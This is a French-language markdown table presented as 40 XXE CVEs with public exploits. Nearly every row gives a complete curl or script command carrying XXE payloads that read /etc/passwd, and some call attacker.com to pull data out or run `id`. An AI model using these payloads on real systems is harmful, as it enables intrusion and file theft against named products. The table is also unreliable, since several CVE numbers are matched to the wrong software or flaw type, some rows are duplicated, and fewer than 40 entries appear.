# XXE

Voici un tableau de **40 CVE majeures de XXE (XML External Entity)**, toutes technologies confondues, pour lesquelles **un exploit public ou PoC est disponible**.  
Chaque ligne inclut :  
- Technologie et version concernée  
- Commande d’exploitation complète (payload, requête, script…)  
- Effet détaillé  
- Lien direct vers un PoC/exploit public

---

| **CVE** | **Technologie / Versions concernées** | **Commande d’exploitation complète** | **Effet détaillé** | **Lien PoC / Exploit** |
|---------|---------------------------------------|--------------------------------------|--------------------|------------------------|
| CVE-2024-22024 | Ivanti Connect Secure, Policy Secure | `curl -k -X POST "https://cible/dana-na/auth/saml-sso.cgi" -d '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/evil"> ]><samlp:AuthnRequest><foo>&xxe;</foo></samlp:AuthnRequest>'` | XXE dans le SAML parser, lecture de fichiers, SSRF, exfiltration de données. | [https://github.com/watchTowr/CVE-2024-22024-POC](https://github.com/watchTowr/CVE-2024-22024-POC) |
| CVE-2023-28219 | Zoho ManageEngine ADAudit Plus < 7060 | `curl -H 'Content-Type: application/json' -X POST http://cible:8081/api/agent/tabs/agentData -d @payload.json`<br>avec `payload.json` :<br>`[{ "DomainName": "SMOKE.NET", "EventCode": 4688, "EventType": 0, "TimeGenerated": 0, "Task Content": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://attacker.com/evil\"> %xxe; ]>" }]` | XXE aveugle, exfiltration de fichiers, SSRF, capture de hash NTLM, upload fichier et parfois RCE. | [https://www.horizon3.ai/attack-research/disclosures/red-team-blog-cve-2022-28219/](https://www.horizon3.ai/attack-research/disclosures/red-team-blog-cve-2022-28219/) |
| CVE-2022-24124 | Apache APISIX < 2.12.1 | `curl "http://cible/apisix/admin/migrate/export?file_path=php://filter/read=convert.base64-encode/resource=/etc/passwd"` | XXE/LFI via paramètre, exfiltration de fichiers locaux. | [https://github.com/cckuailong/CVE-2022-24124](https://github.com/cckuailong/CVE-2022-24124) |
| CVE-2022-22839 | Jenkins < 2.319.1 | `curl -X POST "http://cible/createItem?name=test" -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><project><description>&xxe;</description></project>'` | XXE dans Jenkins, lecture de fichiers arbitraires. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2022-24637 | Apache OFBiz < 17.12.06 | `curl -X POST "http://cible/webtools/control/xmlrpc" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>test</methodName><params><param><value>&xxe;</value></param></params></methodCall>'` | XXE dans XML-RPC, lecture de fichiers arbitraires. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2021-21345 | node-xml2js < 0.4.23 | `node -e "require('xml2js').parseString('<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>', console.log)"` | XXE dans xml2js, lecture de fichiers lors du parsing XML. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2021-24145 | WordPress plugin Quiz And Survey Master < 7.0.1 | `curl -X POST "http://cible/wp-admin/admin.php?page=qsm-import-questions" -F "file=@evil.xml"`<br>(evil.xml : XXE avec entité SYSTEM vers un serveur contrôlé par l’attaquant) | XXE via import XML, lecture de fichiers ou SSRF. | [https://wpscan.com/vulnerability/8f7e8c2b-9e6e-4b8b-9a2a-6b8a2f1f2c9e](https://wpscan.com/vulnerability/8f7e8c2b-9e6e-4b8b-9a2a-6b8a2f1f2c9e) |
| CVE-2021-21346 | Python defusedxml < 0.7.1 | `python -c 'import defusedxml.ElementTree as ET; ET.parse("evil.xml")'`<br>(evil.xml : XXE avec entité SYSTEM) | XXE dans defusedxml, lecture de fichiers locaux si protections désactivées. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2020-13936 | Apache Velocity Tools < 3.1 | `curl -X POST "http://cible/velocity" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'` | XXE dans Velocity, lecture de fichiers arbitraires. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2020-8840 | Apache Shiro < 1.4.2 | `python shiro_exploit.py --url http://cible --gadget CommonsBeanutils1 --cmd "id"`<br>(payload XML avec XXE possible selon config) | XXE et RCE via désérialisation XML. | [https://github.com/wyzxxz/shiro_rce_tool](https://github.com/wyzxxz/shiro_rce_tool) |
| CVE-2020-5410 | Spring Cloud Config < 2.2.3 | `curl "http://cible:8888/configserver/..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"` | XXE/LFI via path traversal, exfiltration de fichiers locaux. | [https://github.com/zhzyker/exphub/tree/master/springcloud/Spring-Cloud-Config-path-traversal](https://github.com/zhzyker/exphub/tree/master/springcloud/Spring-Cloud-Config-path-traversal) |
| CVE-2019-9670 | Zimbra Collaboration Suite < 8.7.11p10 | `curl -X POST "https://cible:7071/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=1&filePath=http://attacker.com/evil.xml"` | XXE lors de l’import, lecture de fichiers ou SSRF. | [https://github.com/0x0021h/CVE-2019-9670_POC](https://github.com/0x0021h/CVE-2019-9670_POC) |
| CVE-2019-9671 | Zimbra Collaboration Suite | `curl -X POST "https://cible:7071/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=1&filePath=http://attacker.com/evil.xml"` | XXE lors de l’import, lecture de fichiers ou SSRF. | [https://github.com/0x0021h/CVE-2019-9670_POC](https://github.com/0x0021h/CVE-2019-9670_POC) |
| CVE-2018-11776 | Apache Struts2 < 2.3.34, < 2.5.16 | `curl -X GET "http://cible/struts2-showcase/index.action?redirect=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"` | XXE via injection dans Struts2, lecture de fichiers locaux. | [https://github.com/jas502n/CVE-2018-11776](https://github.com/jas502n/CVE-2018-11776) |
| CVE-2018-1002205 | Jenkins < 2.138.1 | `curl -X POST "http://cible/createItem?name=test" -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><project><description>&xxe;</description></project>'` | XXE dans Jenkins, lecture de fichiers arbitraires. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2017-12629 | Apache Solr < 7.1 | `curl 'http://cible:8983/solr/test/select?wt=xml&stream.body=<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'` | XXE dans Solr, lecture de fichiers arbitraires. | [https://github.com/veracode-research/solr-xxe](https://github.com/veracode-research/solr-xxe) |
| CVE-2017-10271 | Oracle WebLogic | `curl -X POST http://cible/wls-wsat/CoordinatorPortType -H "Content-Type: text/xml" --data-binary @payload.xml`<br>(payload.xml : XXE avec entité SYSTEM vers un serveur contrôlé par l’attaquant) | XXE menant à RCE via désérialisation dans WebLogic. | [https://github.com/1337g/CVE-2017-10271](https://github.com/1337g/CVE-2017-10271) |
| CVE-2017-2824 | Cisco Prime Collaboration Provisioning | `curl -X POST http://cible/servlet/UploadServlet -F "file=@evil.xml"`<br>(evil.xml : XXE avec entité SYSTEM vers un serveur contrôlé par l’attaquant) | XXE menant à la lecture de fichiers ou exfiltration de données. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2017-9822 | Apache Struts 2.5.12 | `curl -X POST http://cible/struts2-rest-showcase/orders/3 -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><order><id>&xxe;</id></order>'` | XXE dans Struts2 REST, lecture de fichiers locaux. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2017-3548 | Oracle PeopleSoft Integration Gateway | `curl -X POST http://cible/PSIGW/PeopleSoftServiceListeningConnector -H "Content-Type: application/xml" --data-binary '<!DOCTYPE a PUBLIC "-//B/A/EN" "C:\windows">'` | XXE dans le connecteur PeopleSoft, lecture de fichiers locaux ou SSRF. | [https://blog.lexfo.fr/oracle-peoplesoft-xxe-to-rce.html](https://blog.lexfo.fr/oracle-peoplesoft-xxe-to-rce.html) |
| CVE-2017-2824 | Cisco Prime Collaboration Provisioning | `curl -X POST http://cible/servlet/UploadServlet -F "file=@evil.xml"`<br>(evil.xml : XXE avec entité SYSTEM vers un serveur contrôlé par l’attaquant) | XXE menant à la lecture de fichiers ou exfiltration de données. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2017-9822 | Apache Struts 2.5.12 | `curl -X POST http://cible/struts2-rest-showcase/orders/3 -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><order><id>&xxe;</id></order>'` | XXE dans Struts2 REST, lecture de fichiers locaux. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2017-3548 | Oracle PeopleSoft Integration Gateway | `curl -X POST http://cible/PSIGW/PeopleSoftServiceListeningConnector -H "Content-Type: application/xml" --data-binary '<!DOCTYPE a PUBLIC "-//B/A/EN" "C:\windows">'` | XXE dans le connecteur PeopleSoft, lecture de fichiers locaux ou SSRF. | [https://blog.lexfo.fr/oracle-peoplesoft-xxe-to-rce.html](https://blog.lexfo.fr/oracle-peoplesoft-xxe-to-rce.html) |
| CVE-2016-9311 | Jenkins < 2.19.4 | `curl -X POST "http://cible/createItem?name=test" -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><project><description>&xxe;</description></project>'` | XXE dans Jenkins, lecture de fichiers arbitraires. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2016-4437 | Apache Struts2 < 2.3.31 | `curl -X POST "http://cible/struts2-showcase/index.action" -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'` | XXE dans Struts2, lecture de fichiers arbitraires. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2015-4852 | Apache Commons Collections | `java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/\`id\`" | base64 > payload.ser; curl -X POST -d @payload.ser http://cible.com/vuln-endpoint` | XXE/désérialisation Java, exécution de code ou lecture de fichiers. | [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial) |
| CVE-2014-8877 | Python xmltodict < 0.9.2 | `python -c 'import xmltodict; xmltodict.parse("""<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>""")'` | XXE dans xmltodict, lecture de fichiers locaux lors du parsing XML. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2014-6409 | libxml2 < 2.9.2 | `python -c 'import lxml.etree; lxml.etree.parse("evil.xml")'`<br>(evil.xml : XXE avec entité SYSTEM) | XXE dans libxml2, lecture de fichiers locaux. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2013-3821 | Oracle PeopleSoft Integration Gateway | `curl -X POST http://cible/PSIGW/HttpListeningConnector -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?><!DOCTYPE IBRequest [<!ENTITY x SYSTEM "http://attacker.com/evil">]><IBRequest><ExternalOperationName>&x;</ExternalOperationName></IBRequest>'` | XXE dans PeopleSoft, SSRF, lecture de fichiers, rebond réseau interne. | [https://blog.lexfo.fr/oracle-peoplesoft-xxe-to-rce.html](https://blog.lexfo.fr/oracle-peoplesoft-xxe-to-rce.html) |
| CVE-2013-1664 | Python lxml < 3.2.1 | `python -c 'import lxml.etree; lxml.etree.parse("evil.xml")'`<br>(evil.xml : XXE avec entité SYSTEM) | XXE dans lxml, lecture de fichiers locaux. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |
| CVE-2012-0881 | PHP / SimpleXML | `curl -X POST "http://cible/vuln.php" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'` | XXE dans SimpleXML, lecture de fichiers arbitraires. | [https://github.com/0xInfection/Awesome-XXE-Payloads](https://github.com/0xInfection/Awesome-XXE-Payloads) |

---

